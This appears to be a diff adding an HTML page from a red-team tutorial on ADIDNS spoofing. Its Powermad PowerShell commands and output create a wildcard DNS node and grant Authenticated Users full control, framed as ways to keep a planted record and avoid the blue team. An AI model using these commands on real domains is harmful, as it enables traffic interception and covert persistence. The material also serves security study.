@@ -1,0 +1,37 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Maintaining Control of Nodes</title>
+</head><body><b>Maintaining Control of Nodes</b><br/>
+To review, once a node is created with an authenticated user, the creator account will have ownership/full control of the node. The ‘Authenticated Users’ principal itself will not be listed at all within the node’s DACL. Therefore, losing access to the creator account can create a scenario where you will not be able to remove an added record. To avoid this, the dNSTombstoned attribute can be set to ‘True’ upon node creation.<br/>
+<br/>
+PS C:\Users\kevin\Desktop\Powermad&gt; New-ADIDNSNode -Node * -Tombstone -Verbose<br/>
+VERBOSE: [+] Domain Controller = Inveigh-DC1.inveigh.net<br/>
+VERBOSE: [+] Domain = inveigh.net<br/>
+VERBOSE: [+] ADIDNS Zone = inveigh.net<br/>
+VERBOSE: [+] Distinguished Name = DC=*,DC=inveigh.net,CN=MicrosoftDNS,DC=DomainDNSZones,DC=inveigh,DC=net<br/>
+VERBOSE: [+] Data = 192.168.125.100<br/>
+VERBOSE: [+] DNSRecord Array = 04-00-01-00-05-F0-00-00-BC-00-00-00-00-00-02-58-00-00-00-00-22-D8-37-00-C0-A8-7D-64<br/>
+[+] ADIDNS node * added<br/>
+<br/>
+This puts a node in a state where any authenticated user can perform node modifications.<br/>
+<br/>
+<img src="image.png" /><br/>
+<br/>
+Alternatively, the node’s DACL can be modified to grant access to additional users or groups.<br/>
+<br/>
+PS C:\Users\kevin\Desktop\Powermad&gt; Grant-ADIDNSPermission -Node * -Principal "Authenticated Users" -Access GenericAll -Verbose<br/>
+VERBOSE: [+] Domain Controller = Inveigh-DC1.inveigh.net<br/>
+VERBOSE: [+] Domain = inveigh.net<br/>
+VERBOSE: [+] ADIDNS Zone = inveigh.net<br/>
+VERBOSE: [+] Distinguished Name = DC=*,DC=inveigh.net,CN=MicrosoftDNS,DC=DomainDNSZones,DC=inveigh,DC=net<br/>
+[+] ACE added for Authenticated Users to * DACL<br/>
+<br/>
+Having the creator account’s ownership and full control permission listed on a node can make things really easy on the blue team in the event they discover your record. Although changing node ownership is possible, a token with the SeRestorePrivilege is required.<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
